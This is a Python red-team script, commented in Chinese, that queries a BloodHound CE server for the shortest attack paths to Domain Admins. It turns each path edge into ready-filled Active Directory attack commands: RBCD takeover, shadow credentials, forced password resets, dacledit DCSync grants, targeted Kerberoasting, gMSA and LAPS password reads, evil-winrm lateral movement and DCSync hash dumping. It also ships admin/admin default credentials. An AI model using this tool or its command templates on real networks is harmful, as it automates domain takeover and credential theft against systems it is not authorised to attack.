#!/usr/bin/env python3
"""bh-path.py — BloodHound CE 最短攻击路径 → 执行台动作建议
用法: bh-path.py [目标组,默认 'DOMAIN ADMINS'] [--url http://127.0.0.1:8080] [--user admin] [--pass admin] [--json]
流程: 登录(/api/v2/login, login_method=secret,凭据读 redops/bh.json)
      → POST /api/v2/graphs/cypher(BH CE v2)固定 shortestPath 到高价值组
      → 解析边序列 → 按映射表输出中文动作建议(注明执行台工具 id / 链 id + 参数预填示例)
无 BH(连不上/登录失败)或非 v2 端点(404) → 非零退出 + 中文提示
"""
import argparse, json, sys, urllib.request, urllib.error
from pathlib import Path

CFG_DIR = Path(__file__).resolve().parent.parent / "redops"

# 固定 Cypher:最短路径到高价值目标组(Domain Admins / Enterprise Admins 等)
CYPHER = """
MATCH (g:Group)
WHERE toUpper(g.name) STARTS WITH '{target}@' OR toUpper(g.name) = '{target}'
MATCH p = shortestPath((s)-[*1..10]->(g))
WHERE (s:User OR s:Computer) AND s <> g
RETURN p LIMIT 20
"""

def load_cfg():
    cfg = {"url": "http://127.0.0.1:8080", "user": "admin", "pass": "admin"}
    p = CFG_DIR / "bh.json"
    if p.exists():
        cfg.update(json.loads(p.read_text()))
    return cfg

def parse_args():
    ap = argparse.ArgumentParser(description="BH CE 最短攻击路径 → 执行台动作建议")
    ap.add_argument("target", nargs="?", default="DOMAIN ADMINS",
                    help="高价值目标组名(默认 DOMAIN ADMINS;可填 ENTERPRISE ADMINS)")
    ap.add_argument("--url", help="BH CE 地址(覆盖 redops/bh.json)")
    ap.add_argument("--user", help="登录用户名")
    ap.add_argument("--pass", dest="passwd", help="登录密码(secret)")
    ap.add_argument("--json", action="store_true", help="结构化 JSON 输出")
    return ap.parse_args()

def api(cfg, path, data=None, token=None, method=None):
    req = urllib.request.Request(cfg["url"].rstrip("/") + path,
                                 data=json.dumps(data).encode() if data is not None else None,
                                 headers={"Content-Type": "application/json"},
                                 method=method or ("POST" if data is not None else "GET"))
    if token: req.add_header("Authorization", f"Bearer {token}")
    try:
        r = urllib.request.urlopen(req, timeout=20)
        return r.status, json.loads(r.read() or b"{}")
    except urllib.error.HTTPError as e:
        try: body = json.loads(e.read() or b"{}")
        except Exception: body = {}
        return e.code, body

def login(cfg):
    """登录返回 session_token;失败打印并返回 None"""
    st, res = api(cfg, "/api/v2/login", {"login_method": "secret", "username": cfg["user"], "secret": cfg["pass"]})
    if st != 200:
        print(f"[!] 登录失败 HTTP {st}: {json.dumps(res, ensure_ascii=False)[:200]}")
        return None
    return res["data"]["session_token"]

# ---------- 图解析 ----------
def ekind(e):  return e.get("kind") or e.get("label") or ""
def extract_paths(nodes, edges):
    """边列表 → 节点链列表;每条 = [(src_nid, 边类型, dst_nid), ...]"""
    adj, srcs, tgts = {}, set(), set()
    for e in edges:
        s, t = str(e.get("source", "")), str(e.get("target", ""))
        if not s or not t: continue
        adj.setdefault(s, []).append((t, ekind(e))); srcs.add(s); tgts.add(t)
    starts = sorted(srcs - tgts) or sorted(srcs)[:1]
    paths = []
    def dfs(node, visited, acc):
        if len(paths) >= 50: return
        nxts = [(t, k) for t, k in adj.get(node, []) if t not in visited]
        if not nxts:
            if acc: paths.append(acc)
            return
        for t, k in nxts:
            dfs(t, visited | {t}, acc + [(node, k, t)])
    for s in starts:
        dfs(s, {s}, [])
    return paths

def nlabel(nodes, nid):
    n = nodes.get(str(nid)) or {}
    return n.get("label") or n.get("name") or str(nid)
def nkind(nodes, nid):
    return (nodes.get(str(nid)) or {}).get("kind") or ""

# ---------- 边 → 动作建议映射(中文,注明执行台工具 id / 链 id) ----------
def _u(label):  return label.split("@")[0]                      # 用户 sAMAccountName
def _c(label):  return label.split(".")[0].rstrip("$")         # 机器名(不带$)
def _d(label):
    parts = label.split("@")
    return parts[1].lower() if len(parts) > 1 else label.lower().split(".", 1)[-1]

def actions_for(kind, tk, tl):
    """返回 [(排序键, 动作, 工具/链, 参数预填示例)];tk=目标节点类型,tl=目标节点名"""
    if kind in ("GenericAll", "Owns", "GenericWrite"):
        if tk == "Computer":
            return [(20, "RBCD 委派接管该机器", "链 rbcd",
                     f"链 rbcd: victim={_c(tl)} user=<有写权限用户>(第①步自动建受控机户)")]
        return [(10, "影子凭据长期控制该用户", "工具 shadow-add",
                 f"shadow-add: targetuser={_u(tl)}"),
                (11, "强制改密立即接管", "impacket-changepasswd / bloodyAD set password",
                 f"impacket-changepasswd -newpass '<新密码>' {_d(tl)}/<当前用户>:<密码>@<域控> -user {_u(tl)}")]
    if kind == "AddKeyCredentialLink":
        return [(12, "影子凭据(KeyCredentialLink 直写)", "工具 shadow-add",
                 f"shadow-add: targetuser={_u(tl)}")]
    if kind == "WriteDacl":
        return [(30, "dacledit 授 DCSync 复制权(手法见 10 号文档)", "dacledit(参考 10-域渗透一条龙)",
                 f"python3 dacledit.py -action write -rights DCSync -principal <我控用户> -target-dn 'DC={_d(tl).replace('.', ',DC=')}' '{_d(tl)}/<用户>:<密码>' -dc-ip <域控IP>")]
    if kind == "ForceChangePassword":
        return [(13, "强制改密", "impacket-changepasswd / bloodyAD set password",
                 f"bloodyAD set password <域名> {_u(tl)} '<新密码>' --host <域控IP>")]
    if kind == "AddMember":
        return [(40, "把自己加进该组拿权限", "net group / bloodyAD add groupMember",
                 f"net group \"{_u(tl)}\" <我控用户> /add /domain  (或 bloodyAD add groupMember {_d(tl)} \"{_u(tl)}\" <我控用户>)")]
    if kind == "WriteSPN":
        return [(50, "写 SPN 后定向 Kerberoast", "impacket-GetUserSPNs / targetedKerberoast",
                 f"先 setspn 写入再 impacket-GetUserSPNs <域>/<用户>:<密码> -request -target-domain {_d(tl)} 单点 {_u(tl)}")]
    if kind == "ReadGMSAPassword":
        return [(60, "直接读 gMSA 密码", "工具 gmsa",
                 "gmsa: user=<有读取权用户> pass=<密码> dcip=<域控IP>")]
    if kind == "ReadLAPSPassword":
        return [(61, "直接读 LAPS 本地管理员密码", "工具 laps-v2",
                 "laps-v2: dcip=<域控IP> user=<有LAPS读取权用户> pass=<密码>")]
    if kind in ("AdminTo", "CanRDP", "CanPSRemote", "ExecuteDCOM"):
        return [(70, "横向登录该机器", "工具 evilwinrm / psexec(可勾多目标走 run_multi)",
                 f"evilwinrm: target={_c(tl)} user=<管理员> nthash=<NT哈希>")]
    if kind in ("GetChanges", "GetChangesAll"):
        return []   # 组合判断见 actions_for_path
    return [(99, f"未映射边 {kind}:人工研判(参考 BloodHound 界面 Abuse 说明)", "-", "-")]

def actions_for_path(nodes, path):
    """整条路径的排序去重动作建议"""
    acts = []
    kinds = {k for _, k, _ in path}
    for _, k, t in path:
        acts += actions_for(k, nkind(nodes, t), nlabel(nodes, t))
    if {"GetChanges", "GetChangesAll"} <= kinds:
        dom = _d(nlabel(nodes, path[-1][2]))
        acts.append((80, "复制权齐全 → DCSync 拉全域哈希", "工具 dcsync",
                     f"dcsync: domain={dom} user=<持权用户> pass=<密码> dc=<域控FQDN>"))
    seen, out = set(), []
    for a in sorted(acts, key=lambda x: x[0]):
        if a[1] in seen: continue
        seen.add(a[1]); out.append(a)
    return out

def chain_str(nodes, path):
    out = nlabel(nodes, path[0][0])
    for _, k, t in path:
        out += f" -[{k}]-> {nlabel(nodes, t)}"
    return out

def main():
    args = parse_args()
    cfg = load_cfg()
    if args.url: cfg["url"] = args.url
    if args.user: cfg["user"] = args.user
    if args.passwd: cfg["pass"] = args.passwd
    target = args.target.strip().upper().replace("'", "").replace('"', "") or "DOMAIN ADMINS"

    try:
        tok = login(cfg)
        if not tok: return 1
        st, res = api(cfg, "/api/v2/graphs/cypher",
                      {"query": CYPHER.format(target=target), "include_properties": False}, tok)
    except (urllib.error.URLError, OSError) as e:
        print(f"[!] 连不上 BloodHound CE({cfg['url']}): {e}")
        print("    → 先启动: systemctl start bloodhound neo4j;凭据见 redops/bh.json(配置页可改)")
        return 1
    if st == 404:
        print(f"[!] Cypher 端点 404:已试 POST {cfg['url'].rstrip('/')}/api/v2/graphs/cypher")
        print("    → 当前 BH CE 版本无该端点(需 BH CE v2);请升级 BloodHound 或改用界面 Saved Queries")
        return 1
    if st != 200:
        print(f"[!] Cypher 查询失败 HTTP {st}: {json.dumps(res, ensure_ascii=False)[:200]}")
        return 1

    data = res.get("data") or {}
    nodes = data.get("nodes") or {}
    edges = data.get("edges") or []
    if not edges:
        msg = f"未找到到「{target}」的攻击路径 — 图中无数据或无可达路径;先跑工具 bh-collect 采集并导入 BH"
        if args.json: print(json.dumps({"target": target, "paths": [], "note": msg}, ensure_ascii=False))
        else: print(f"[*] {msg}")
        return 0

    paths = extract_paths(nodes, edges)
    report = []
    for path in paths:
        report.append({
            "chain": [{"node": nlabel(nodes, s), "edge": k} for s, k, _ in path] + [{"node": nlabel(nodes, path[-1][2])}],
            "actions": [{"action": a[1], "tool": a[2], "example": a[3]} for a in actions_for_path(nodes, path)],
        })
    if args.json:
        print(json.dumps({"target": target, "paths": report}, ensure_ascii=False, indent=2))
        return 0

    print(f"[+] 到「{target}」的最短攻击路径 {len(report)} 条(BH CE: {cfg['url']})\n")
    for i, (path, rep) in enumerate(zip(paths, report), 1):
        kinds = [k for _, k, _ in path]
        print(f"== 路径 {i} ==")
        print("  " + chain_str(nodes, path))
        print("  动作建议(按优先级):")
        for j, a in enumerate(rep["actions"], 1):
            print(f"    {j}. {a['action']}  【{a['tool']}】")
            print(f"       预填: {a['example']}")
        print()
    print("提示:以上均为执行台已有工具/链,控制台「执行台」页搜 id 即可带参运行")
    return 0

if __name__ == "__main__":
    sys.exit(main())
